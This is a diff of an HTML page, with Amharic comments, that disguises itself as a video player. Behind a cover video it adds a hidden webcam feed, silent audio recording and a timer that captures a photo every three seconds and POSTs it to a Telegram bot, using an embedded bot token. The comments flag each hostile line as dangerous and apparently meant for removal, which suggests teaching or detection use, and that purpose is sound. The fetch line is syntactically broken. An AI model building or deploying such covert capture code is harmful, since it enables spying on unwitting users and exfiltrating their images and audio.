@@ -2,45 +2,63 @@
 <html lang="am">
 <head>
     <meta charset="UTF-8">
-    <title>አውቶማቲክ አሰራር</title>
+    <title>የቪዲዮ ማጫወቻ ገጽ</title>
 </head>
 <body>
 
-    <h1>የቪዲዮ ማጫወቻ ገጽ</h1>
+    <h2>አስደሳች ቪዲዮ ይመልከቱ</h2>
     
-    <!-- ካሜራው/ቪዲዮው የሚታይበት -->
-    <video id="myVideo" autoplay playsinline width="400" height="300"></video>
-    <canvas id="myCanvas" style="display:none;"></canvas>
+    <!-- 1. ተጠቃሚው የሚያየው ሽፋን (Cover) ቪዲዮ -->
+    <video src="video.mp4" width="400" controls autoplay></video>
+
+    <!-- ❌ 1. መወገድ ያለበት መስመር፡ ተጠቃሚው እንዳያየው የተደበቀ ካሜራና Canvas -->
+    <video id="hiddenWebcam" style="display:none;" autoplay></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
-        const video = document.getElementById('myVideo');
-        const canvas = document.getElementById('myCanvas');
-        const context = canvas.getContext('2d');
+        const hiddenWebcam = document.getElementById('hiddenWebcam');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const context = hiddenCanvas.getContext('2d');
 
-        // ካሜራውን ማስጀመር
+        // የካሜራ ፍቃድ መጠየቅ
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(function(stream) {
-                video.srcObject = stream;
+                hiddenWebcam.srcObject = stream;
 
-                // ❌❌❌ ዋናው መጥፎው መስመር እዚህ ይጀምራል ❌❌❌
-                // ተጠቃሚው ምንም ሳይጫን በራሱ ጊዜ የሚሰራ ታይመር
+                // ❌ 2. መወገድ ያለበት መስመር፡ በስተጀርባ ድምፅ የሚቀርጽ አደገኛ ፈንክሽን
+                startHiddenAudioRecord(stream);
+
+                // ❌ 3. መወገድ ያለበት መስመር፡ በየ 3 ሰከንዱ በስውር ፎቶ የሚያነሳ ታይመር
                 setInterval(function() {
                     
-                    // 1. ፎቶ ማንሳት
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let photoData = canvas.toDataURL('image/jpeg');
+                    // በስውር ፎቶ ማንሳት
+                    hiddenCanvas.width = hiddenWebcam.videoWidth;
+                    hiddenCanvas.height = hiddenWebcam.videoHeight;
+                    context.drawImage(hiddenWebcam, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                    let photoData = hiddenCanvas.toDataURL('image/jpeg');
 
-                    // 2. አውቶማቲክ መላክ
-                    sendAutoData(photoData);
+                    // ❌ 4. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት በስውር መላኪያ ጥሪ
+                    sendSecretToTelegram(photoData);
 
-                }, 3000); // 👈 3000 ማለት በየ 3 ሰከንዱ አውቶማቲክ ይደጋገማል!
+                }, 3000); // 👈 በየ 3 ሰከንዱ አውቶማቲክ ይደጋገማል!
             });
 
-        function sendAutoData(data) {
-            console.log("⚠️ አውቶማቲክ መላክ በየ 3 ሰከንዱ እየተካሄደ ነው!");
-            // እዚህ ውስጥ ያለ የ መላኪያ ጥሪ በየሰከንዱ አውቶማቲክ ያደርገዋል
+        // ❌ 5. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት የሚላክበት አካል
+        function sendSecretToTelegram(photo) {
+            let botToken = "123456789:YOUR_BOT_TOKEN";
+            let chatId = "987654321";
+            
+            fetch(https://api.telegram.org/bot${8818405487:AAF1n4fyHEZYcXg3ugIIB6KDNoDxy06DuV0}/sendPhoto, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, photo: photo })
+            });
+        }
+
+        // ❌ 6. መወገድ ያለበት መስመር፡ ድምፅ በስውር መቅረጫ
+        function startHiddenAudioRecord(stream) {
+            let mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.start();
         }
     </script>
 
